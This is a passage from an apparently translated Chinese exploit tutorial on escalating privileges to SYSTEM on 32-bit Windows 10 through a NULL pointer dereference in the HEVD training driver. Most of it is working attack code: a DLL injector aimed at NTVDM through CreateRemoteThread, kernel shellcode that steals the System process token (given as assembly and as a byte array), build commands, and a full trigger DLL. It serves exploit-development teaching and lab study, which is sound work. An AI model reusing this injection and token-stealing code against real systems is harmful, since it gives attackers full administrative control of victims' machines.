            return 3;
        }
        else {
            printf("[.] Found LoadLibrary() at address %pn", loadLibrary);
        }
        GetCurrentDirectoryA(sizeof(currentDir), currentDir);
        sprintf_s(dllPath, sizeof(dllPath), "%s\%s", currentDir, "exploit.dll");
        if (WriteProcessMemory(pHandle, destMem, dllPath, strlen(dllPath), &written) == 0) {
            printf("[X] WriteProcessMemory() failedn");
            return 3;
        }
        else {
            printf("[.] WriteProcessMemory() successfully wrote exploit DLL path to NTVDMn");
        }
        if (CreateRemoteThread(pHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibrary, destMem, NULL, NULL) == NULL) {
            printf("[X] CreateRemoteThread() failed to load DLL in victim processn");
            return 3;
        }
        else {
            printf("[!!!] CreateRemoteThread() finished, exploit running...n");
        }
        printf("[!!!] If the exploit was successful, you should now be SYSTEM... enjoy :Dnn");
    }
现在，我们需要制作一个DLL来承载我们的漏洞代码。由于DLL将被注入NTVDM.exe的进程地址空间，因此我们需要：  
1、编写内核Shellcode，该Shellcode要支持Windows 10的x86版本；  
2、一旦我们的DLL被加载，就要复制Shellcode到地址100h处；  
3、在地址4h处，添加一个指向Shellcode的指针，以便Callback属性使用；  
4、为HEVD驱动程序触发DeviceloControl，它会将执行传递给Shellcode。  
首先，看看我们的内核Shellcode。对于这个漏洞，我们重新使用此前WARBIRD的Shellcode，它会寻找cmd.exe进程，并从特权系统进程中复制进程令牌。
    pushad
    mov eax, [fs:0x120 + 0x4]   ; Get 'CurrentThread' from KPRCB
    mov eax, [eax + 0x150]       ; Get 'Process' property from current thread
    next_process:
    cmp dword [eax + 0x17c], 'cmd.'  ; Search for 'cmd.exe' process
    je found_cmd_process
    mov eax, [eax + 0xb8]            ; If not found, go to next process
    sub eax, 0xb8
    jmp next_process
    found_cmd_process:
    mov ebx, eax                     ; Save our cmd.exe EPROCESS for later
    find_system_process:
    cmp dword [eax + 0xb4], 0x00000004  ; Search for PID 4 (System process)
    je found_system_process
    mov eax, [eax + 0xb8]
    sub eax, 0xb8
    jmp find_system_process
    found_system_process:
    mov ecx, [eax + 0xfc]            ; Take TOKEN from System process
    mov [ebx+0xfc], ecx              ; And copy it to the cmd.exe process
    popad
    ret
在这里，需要注意这个32位的Ring-0 Shellcode和我们之前Win 7 x64的Shellcode还是有一些细微区别的：  
1、用来派生KPRCB结构的段寄存器是fs寄存器而不是gs寄存器；  
2、所有到nt!_EPROCESS、nt!_KTHREAD和nt!KPRCB结构的偏移量都是不同的。  
我们有了Shellcode之后，就可以对它进行编译：
    nasm /tmp/win10-32.asm -o /tmp/win10-32.bin -f bin
并提取一个C缓冲区：
    radare2 -b 32 -c 'pc' /tmp/win10-32.bin
这样，我们得到的C缓冲区如下：
    const uint8_t buffer[] = {
      0x60, 0x64, 0xa1, 0x24, 0x01, 0x00, 0x00, 0x8b, 0x80, 0x50,
      0x01, 0x00, 0x00, 0x81, 0xb8, 0x7c, 0x01, 0x00, 0x00, 0x63,
      0x6d, 0x64, 0x2e, 0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00,
      0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00, 0xeb, 0xe7, 0x89, 0xc3,
      0x83, 0xb8, 0xb4, 0x00, 0x00, 0x00, 0x04, 0x74, 0x0d, 0x8b,
      0x80, 0xb8, 0x00, 0x00, 0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00,
      0xeb, 0xea, 0x8b, 0x88, 0xfc, 0x00, 0x00, 0x00, 0x89, 0x8b,
      0xfc, 0x00, 0x00, 0x00, 0x61, 0xc3, 0xff, 0xff, 0xff, 0xff,
    };
接下来，就需要编写我们的DLL。类似于Windows 7漏洞，需要通过DeviceloControl调用来触发空指针引用：
    HANDLE driverHandle = CreateFileA(
        "\\.\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    char exploit[1024];
    memset(exploit, 'A', sizeof(exploit));
    DeviceIoControl(
        driverHandle,
        HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
        exploit,
        sizeof(exploit),
        NULL,
        0,
        NULL,
        NULL
    );
然而，在我们触发之前，需要确保Shellcode已经到位。首先通过利用VirualProtect来确保NULL页被设置为RWX：
    DWORD oldProt;
    // Make sure that NULL page is RWX
    VirtualProtect(0, 4096, PAGE_EXECUTE_READWRITE, &oldProt);
接下来，将Shellcode复制到地址100h：
    // Copy our shellcode to the NULL page at offset 0x100
    RtlCopyMemory((void*)0x100, shellcode, 256);
最后，我们在4h设置一个指向Shellcode的指针，这是驱动程序使用的Callback()属性的32位偏移量：
    // Set the ->Callback() function pointer
    *(unsigned long long *)0x04 = 0x100;
结合起来，我们最终的漏洞利用代码如下：
    #include "stdafx.h"
    #define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)
    // Shellcode to be executed by exploit
    const char shellcode[256] = {
        0x60, 0x64, 0xa1, 0x24, 0x01, 0x00, 0x00, 0x8b, 0x80, 0x50,
        0x01, 0x00, 0x00, 0x81, 0xb8, 0x7c, 0x01, 0x00, 0x00, 0x63,
        0x6d, 0x64, 0x2e, 0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00,
        0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00, 0xeb, 0xe7, 0x89, 0xc3,
        0x83, 0xb8, 0xb4, 0x00, 0x00, 0x00, 0x04, 0x74, 0x0d, 0x8b,
        0x80, 0xb8, 0x00, 0x00, 0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00,
        0xeb, 0xea, 0x8b, 0x88, 0xfc, 0x00, 0x00, 0x00, 0x89, 0x8b,
        0xfc, 0x00, 0x00, 0x00, 0x61, 0xc3, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff
    };
    void exploit(void) {
        DWORD BytesReturned;
        DWORD oldProt;
        // Make sure that NULL page is RWX
        VirtualProtect(0, 4096, PAGE_EXECUTE_READWRITE, &oldProt);
        // Set the ->Callback() function pointer
        *(unsigned long long *)0x04 = 0x100;
        // Copy our shellcode to the NULL page at offset 0x100
        RtlCopyMemory((void*)0x100, shellcode, 256);
        HANDLE driverHandle = CreateFileA(
            "\\.\HackSysExtremeVulnerableDriver",
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        char exploit[1024];
        // Trigger the vulnerability
        memset(exploit, 'A', sizeof(exploit));
        DeviceIoControl(
            driverHandle,
            HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
            exploit,
            sizeof(exploit),
            NULL,
            0,
            NULL,
            NULL
        );
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            exploit();
            break;
        }
        return TRUE;
    }
如下图所示，运行时可以成功得到SYSTEM Shell：